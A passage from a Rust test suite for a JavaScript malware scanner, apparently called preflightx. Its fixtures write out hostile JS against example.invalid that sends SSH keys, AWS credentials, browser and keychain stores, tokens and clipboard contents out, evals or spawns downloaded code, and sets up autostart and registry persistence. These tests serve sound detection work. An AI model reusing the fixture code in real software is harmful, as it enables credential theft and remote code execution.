    fs::write(root.join("main.js"), b"const { unpack } = require('./named.js');\nconst defaultUnpack = require('./default.js');\nasync function boot() {\n const response = await fetch('https://example.invalid/x');\n Function(unpack(await response.text()))();\n Function(defaultUnpack(await response.text()))();\n}\nboot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
            .count(),
        2,
        "{}",
        report["findings"]
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn static_eval_does_not_form_remote_execution_chain() {
    let root = temporary_directory("static-eval");
    fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn environment_secret_reaches_outbound_request() {
    let root = temporary_directory("secret-exfil");
    fs::write(
        root.join("main.js"),
        b"import axios from 'axios'; const secret = process.env.TOKEN; axios.post('https://example.invalid/collect', JSON.stringify({ token: secret }));",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert!(finding["evidence"].to_string().contains("process.env"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn imported_secret_reader_reaches_outbound_request_across_modules() {
    let root = temporary_directory("cross-module-secret-exfil");
    fs::write(
        root.join("main.js"),
        b"import { token } from './secrets.js'; fetch('https://example.invalid/collect', { method: 'POST', body: token() });",
    )
    .unwrap();
    fs::write(
        root.join("secrets.js"),
        b"export function token() { return process.env.API_TOKEN; }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
        .unwrap_or_else(|| panic!("missing exfiltration finding: {}", report["findings"]));
    assert_eq!(finding["severity"], "critical");
    assert!(finding["evidence"].to_string().contains("secrets.js"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn home_relative_credential_file_reaches_outbound_request() {
    let root = temporary_directory("home-secret");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const path = require('path'); const os = require('os'); const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa')); fetch('https://example.invalid/collect', { method: 'POST', body: key });").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn environment_derived_home_credential_paths_reach_outbound_request() {
    let root = temporary_directory("environment-home-secret");
    fs::write(
        root.join("main.js"),
        br#"const fs = require('fs'); const path = require('path');
const key = fs.readFileSync(path.join(process.env.HOME, '.ssh', 'id_rsa'));
fetch('https://example.invalid/a', { body: key });
const cloud = fs.readFileSync(process.env.HOME + '/.aws/credentials');
fetch('https://example.invalid/b', { body: cloud });
const settings = fs.readFileSync(path.join(process.env.HOME, '.config', 'settings.json'));
fetch('https://example.invalid/c', { body: settings });"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = report["findings"].as_array().unwrap();
    let exfiltration = findings
        .iter()
        .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
        .collect::<Vec<_>>();
    assert_eq!(exfiltration.len(), 2, "{}", report["findings"]);
    assert!(
        exfiltration
            .iter()
            .any(|finding| finding["evidence"].to_string().contains(".ssh/id_rsa"))
    );
    assert!(
        exfiltration
            .iter()
            .any(|finding| finding["evidence"].to_string().contains(".aws/credentials"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn browser_and_password_store_paths_reach_outbound_request() {
    let root = temporary_directory("browser-store-exfil");
    let paths = [
        r"C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\default\logins.json",
        r"C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\default\key4.db",
        r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Local State",
        "/Users/user/Library/Keychains/login.keychain-db",
        "/Users/user/.password-store/login.gpg",
        "/Users/user/AppData/Local/Temp/settings.json",
    ];
    let source = paths
        .iter()
        .enumerate()
        .map(|(index, path)| {
            format!(
                "const file{index} = fs.readFileSync({path:?}); fetch('https://example.invalid/collect', {{ body: file{index} }});"
            )
        })
        .collect::<Vec<_>>()
        .join("\n");
    fs::write(
        root.join("main.js"),
        format!("const fs = require('fs');\n{source}"),
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
            .count(),
        5
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn browser_send_beacon_exfiltration_is_detected_without_tainting_its_return() {
    let root = temporary_directory("send-beacon-exfil");
    fs::write(
        root.join("main.js"),
        b"navigator.sendBeacon('/collect', process.env.TOKEN);\nglobalThis.navigator.sendBeacon('/collect', process.env.HOME);\nwindow.navigator.sendBeacon('/collect', process.env.SECRET);\nconst result = navigator.sendBeacon('/metrics', 'ok'); eval(result);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = report["findings"].as_array().unwrap();
    assert_eq!(
        findings
            .iter()
            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
            .count(),
        3
    );
    assert!(
        findings
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn imported_download_helper_reaches_process_execution_across_modules() {
    let root = temporary_directory("cross-module-download-execute");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join("main.js"),
        b"import { download } from './payload.js'; const cp = require('node:child_process'); async function start() { await download('/tmp/helper'); cp.spawn('/tmp/helper'); } start();",
    )
    .unwrap();
    fs::write(
        root.join("payload.js"),
        b"import { writeFile } from 'node:fs/promises'; export async function download(path) { const response = await fetch('https://example.invalid/helper'); await writeFile(path, await response.text()); }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
        .unwrap_or_else(|| panic!("missing download-execute finding: {}", report["findings"]));
    assert_eq!(finding["severity"], "critical");
    assert!(finding["evidence"].to_string().contains("payload.js"));
    assert!(finding["evidence"].to_string().contains("spawn"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn callback_and_stream_credential_reads_reach_http() {
    let root = temporary_directory("credential-read-forms");
    fs::write(
        root.join("main.js"),
        b"const fs = require('fs');\nfs.readFile('/home/user/.aws/credentials', (error, contents) => fetch('https://example.invalid/a', { body: contents }));\nconst stream = fs.createReadStream('/home/user/.ssh/id_rsa');\nfetch('https://example.invalid/b', { body: stream });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = report["findings"].as_array().unwrap();
    assert_eq!(
        findings
            .iter()
            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
            .count(),
        2
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn clipboard_data_reaches_outbound_request() {
    let root = temporary_directory("clipboard-exfil");
    fs::write(root.join("main.js"), b"const clipboardy = require('clipboardy'); const value = clipboardy.readSync(); fetch('https://example.invalid/collect', { method: 'POST', body: value });").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("clipboardy"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn secret_sent_over_websocket_is_reported() {
    let root = temporary_directory("websocket-exfil");
    fs::write(root.join("main.js"), b"const socket = new WebSocket('wss://example.invalid/collect'); socket.send(process.env.TOKEN);").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("WebSocket.send"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn websocket_message_callback_reaches_dynamic_execution() {
    let root = temporary_directory("websocket-control");
    fs::write(root.join("main.js"), b"const WebSocket = require('ws'); const socket = new WebSocket('wss://example.invalid/control'); socket.on('message', data => eval(data.toString()));").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("ws"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn node_https_data_callback_reaches_dynamic_execution() {
    let root = temporary_directory("https-response");
    fs::write(root.join("main.js"), b"const https = require('https'); https.get('https://example.invalid/control', response => { response.on('data', chunk => eval(chunk.toString())); });").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("https.get"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn node_http_data_chunks_reach_execution_in_the_end_callback() {
    let root = temporary_directory("http-chunked-response");
    fs::write(
        root.join("main.js"),
        b"const https = require('https'); https.get('https://example.invalid/control', response => { let payload = ''; response.on('data', chunk => { payload += chunk; }); response.on('end', () => eval(payload)); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn node_http_buffered_chunks_reach_execution_in_the_end_callback() {
    let root = temporary_directory("http-buffered-response");
    fs::write(
        root.join("main.js"),
        b"const https = require('https'); https.get('https://example.invalid/control', response => { const chunks = []; response.on('data', chunk => chunks.push(chunk)); response.on('end', () => eval(Buffer.concat(chunks).toString())); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn node_http_data_callback_does_not_taint_immediate_code() {
    let root = temporary_directory("http-stream-callback-order");
    fs::write(
        root.join("main.js"),
        b"const https = require('https'); https.get('https://example.invalid/control', response => { let payload = ''; response.on('data', chunk => { payload += chunk; }); eval(payload); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fetch_stream_reader_chunks_reach_execution_but_reads_alone_do_not() {
    let root = temporary_directory("fetch-stream-reader");
    fs::write(
        root.join("positive.js"),
        br#"async function boot() {
  const response = await fetch('https://example.invalid/control');
  const reader = response.body.getReader();
  const { value } = await reader.read();
  eval(new TextDecoder().decode(value));
}
boot();"#,
    )
    .unwrap();
    fs::write(
        root.join("negative.js"),
        br#"async function boot() {
  const response = await fetch('https://example.invalid/content');
  const reader = response.body.getReader();
  await reader.read();
  eval('constant');
}
boot();"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let executions = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .collect::<Vec<_>>();
    assert_eq!(executions.len(), 1, "{}", report["findings"]);
    assert!(
        executions[0]["evidence"]
            .to_string()
            .contains("stream chunk")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn promise_function_callbacks_and_static_template_sink_are_traced() {
    let root = temporary_directory("function-callback");
    fs::write(
        root.join("main.js"),
        b"import fetch from 'node-fetch'; fetch('https://example.invalid/control').then(function(response) { return response.text(); }).then(function(payload) { globalThis[`Fun` + `ction`](payload)(); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn socket_io_secret_emission_and_raw_socket_input_are_traced() {
    let root = temporary_directory("socket-io");
    fs::write(
        root.join("exfil.js"),
        b"import { io } from 'socket.io-client'; const socket = io('https://example.invalid'); socket.emit('config', process.env.TOKEN);",
    )
    .unwrap();
    fs::write(
        root.join("control.js"),
        b"const net = require('net'); const cp = require('node:child_process'); const socket = net.connect(4444, 'example.invalid'); socket.on('data', function(data) { cp.execFile('node', [data]); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("socket.io.emit"))
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION"
                && finding["evidence"].to_string().contains("net.connect"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn home_directory_data_reaches_dns_lookup() {
    let root = temporary_directory("home-dns");
    fs::write(
        root.join("main.js"),
        b"const os = require('os'); const dns = require('dns'); dns.lookup(os.homedir(), () => {});",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("os.homedir"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn streamed_remote_file_is_correlated_with_process_execution() {
    let root = temporary_directory("stream-write");
    fs::write(
        root.join("main.js"),
        b"const https = require('https'); const fs = require('fs'); const cp = require('child_process'); https.get('https://example.invalid/payload', response => { response.pipe(fs.createWriteStream('/tmp/payload')); cp.spawn('/tmp/payload'); });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_bytes_written_then_spawned_are_correlated() {
    let root = temporary_directory("write-spawn");
    fs::write(
        root.join("main.js"),
        b"const fs = require('fs'); const cp = require('child_process'); async function run() { const bytes = await fetch('https://example.invalid/x'); fs.writeFileSync('/tmp/payload', bytes); fs.chmodSync('/tmp/payload', 0o755); cp.spawn('/tmp/payload'); } run();",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE"
                    && finding["severity"] == "critical"
                    && finding["evidence"].to_string().contains("chmod")
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn ordinary_file_written_then_spawned_is_not_a_download_chain() {
    let root = temporary_directory("ordinary-write-spawn");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const cp = require('child_process'); fs.writeFileSync('/tmp/local-helper', '#!/bin/sh'); cp.spawn('/tmp/local-helper');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-DOWNLOAD-WRITE-EXECUTE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn promise_file_write_then_spawn_is_a_download_chain() {
    let root = temporary_directory("promises-write-spawn");
    fs::write(root.join("main.js"), b"import { writeFile } from 'node:fs/promises'; import { spawn } from 'node:child_process'; async function boot() { const response = await fetch('https://example.invalid/helper'); await writeFile('/tmp/remote-helper', await response.text()); spawn('/tmp/remote-helper'); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_response_in_shell_template_reaches_process_sink() {
    let root = temporary_directory("shell-template");
    fs::write(root.join("main.js"), b"const cp = require('child_process'); async function boot() { const response = await fetch('https://example.invalid/control'); cp.exec(`sh -c ${await response.text()}`); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_data_in_bun_spawn_array_reaches_process_sink() {
    let root = temporary_directory("bun-spawn");
    fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/control'); Bun.spawn(['sh', '-c', await response.text()]); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn promise_callbacks_preserve_remote_response_to_execution() {
    let root = temporary_directory("promise-callback");
    fs::write(root.join("main.js"), b"fetch('https://example.invalid/control').then(response => response.text()).then(code => Function(code)());").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn loop_and_try_bodies_are_not_silently_dropped() {
    let root = temporary_directory("control-bodies");
    fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/x'); try { for (let i = 0; i < 1; i++) { eval(await response.text()); } } catch (error) { console.log(error); } } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fetch_response_to_eval_and_secret_file_to_fetch_are_traced() {
    let root = temporary_directory("fetch-and-file");
    fs::write(root.join("main.js"), b"const fs = require('fs'); async function run() { const response = await fetch('https://example.invalid/config'); eval(await response.text()); const key = fs.readFileSync('/home/user/.ssh/id_rsa'); await fetch('https://example.invalid/collect', {method: 'POST', body: key}); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let ids: Vec<&str> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|finding| finding["id"].as_str())
        .collect();
    assert!(ids.contains(&"JS-REMOTE-CODE-EXECUTION"));
    assert!(ids.contains(&"JS-SECRET-EXFILTRATION"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_network_and_environment_use_do_not_form_exfiltration() {
    let root = temporary_directory("benign-network");
    fs::write(root.join("main.js"), b"import axios from 'axios'; const mode = process.env.NODE_ENV; axios.post('/metrics', { count: 1 }); console.log(mode);").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_environment_flag_sent_to_service_is_not_critical() {
    let root = temporary_directory("benign-env-flag");
    fs::write(
        root.join("main.js"),
        b"fetch('/metrics', { method: 'POST', body: process.env.NODE_ENV });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["severity"] != "critical")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_dev_popper_start_correlates_hidden_remote_behaviors() {
    let root = temporary_directory("concealed-start");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"npm run launch","launch":"node main.js"}}"#,
    )
    .unwrap();
    let source = format!(
        "const cp = require('child_process'); {}cp.exec('id'); async function boot() {{ const response = await fetch('https://example.invalid/control'); eval(await response.text()); const secret = process.env.TOKEN; fetch('https://example.invalid/collect', {{ body: secret }}); }} boot();",
        " ".repeat(800)
    );
    fs::write(root.join("main.js"), source).unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-CONCEALED-EXECUTION")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    assert!(finding["evidence"].to_string().contains("npm start"));
    for id in ["JS-REMOTE-CODE-EXECUTION", "JS-SECRET-EXFILTRATION"] {
        let finding = report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|finding| finding["id"] == id)
            .unwrap_or_else(|| panic!("missing {id}: {}", report["findings"]));
        assert!(finding["evidence"].to_string().contains("npm start"));
    }
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn one_startup_route_correlates_exfiltration_and_remote_execution() {
    let root = temporary_directory("combined-chain");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("main.js"), b"import axios from 'axios'; axios.post('https://example.invalid/collect', process.env.TOKEN); async function run() { const response = await axios.get('https://example.invalid/control'); eval(response.data); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-COMBINED-ATTACK-CHAIN")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn untriggered_chains_do_not_claim_one_execution_route() {
    let root = temporary_directory("untriggered-correlation");
    fs::write(root.join("main.js"), b"fetch('https://example.invalid/collect', { method: 'POST', body: process.env.TOKEN }); async function run() { const response = await fetch('https://example.invalid/control'); eval(await response.text()); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-COMBINED-ATTACK-CHAIN")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn startup_file_write_is_reported_but_ordinary_write_is_not() {
    let root = temporary_directory("persistence-write");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const os = require('os'); fs.writeFileSync(os.homedir() + '/.config/autostart/helper.desktop', 'x'); fs.writeFileSync('notes.txt', 'x');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings: Vec<_> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
        .collect();
    assert_eq!(findings.len(), 1);
    assert!(findings[0]["evidence"].to_string().contains("autostart"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fs_promises_secret_read_and_startup_write_are_traced() {
    let root = temporary_directory("fs-promises");
    fs::write(root.join("main.js"), b"import { readFile, writeFile } from 'node:fs/promises'; const key = await readFile('/home/user/.aws/credentials'); await fetch('https://example.invalid/collect', { method: 'POST', body: key }); await writeFile('/home/user/.config/autostart/agent.desktop', 'x');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn registry_startup_command_is_reported_but_quoted_words_are_not() {
    let root = temporary_directory("registry-command");
    fs::write(root.join("main.js"), b"const cp = require('child_process'); cp.exec('reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Agent /d helper.exe'); cp.exec('echo reg add is just documentation');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-PERSISTENCE-COMMAND")
            .count(),
        1
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn class_and_exported_object_methods_preserve_remote_data() {
    let root = temporary_directory("method-flow");
    fs::write(
        root.join("main.js"),
        b"import { remote, Loader } from './api.js';\nnew Loader().run();\nasync function start() { remote.execute(await remote.get()); }\nstart();",
    )
    .unwrap();
    fs::write(
        root.join("api.js"),
        b"export const remote = { async get() { return (await fetch('https://example.invalid/object')).text(); }, execute(code) { eval(code); } };\nexport class Loader { async run() { const response = await fetch('https://example.invalid/class'); eval(await response.text()); } }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = report["findings"].as_array().unwrap();
    let chains: Vec<_> = findings
        .iter()
        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .collect();
    assert_eq!(chains.len(), 2, "{}", report["findings"]);
    assert!(chains.iter().all(|finding| finding["file"] == "api.js"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
    let missing = run(&["definitely-does-not-exist"]);
    let invalid = run(&[".", "--online"]);

    assert_eq!(missing.status.code(), Some(2));
    assert_eq!(invalid.status.code(), Some(3));
}

#[test]
fn rule_commands_explain_implemented_detection() {
    let list = run(&["rules"]);
    let show = run(&["rules", "show", "JS-REMOTE-CODE-EXECUTION"]);
    let explain = run(&["explain", "JS-REMOTE-CODE-EXECUTION"]);
    let unknown = run(&["rules", "show", "UNKNOWN-RULE"]);

    assert_eq!(list.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&list.stdout).contains("JS-REMOTE-CODE-EXECUTION"));
    assert_eq!(show.status.code(), Some(0));
    assert_eq!(show.stdout, explain.stdout);
    assert_eq!(unknown.status.code(), Some(3));
}

fn run(arguments: &[&str]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_preflightx"))
        .args(arguments)
        .output()
        .unwrap()
}

fn temporary_directory(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
